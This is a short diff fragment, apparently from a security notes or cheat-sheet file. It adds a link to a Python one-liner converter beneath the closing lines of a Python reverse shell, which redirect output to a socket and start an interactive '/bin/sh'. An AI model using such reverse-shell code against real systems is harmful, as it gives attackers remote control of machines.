@@ -64,3 +64,5 @@ os.dup2(sdregs.fileno(),2)
 
 p=subprocess.call(["/bin/sh","-i"])
 ```
+
+http://jagt.github.io/python-single-line-convert/
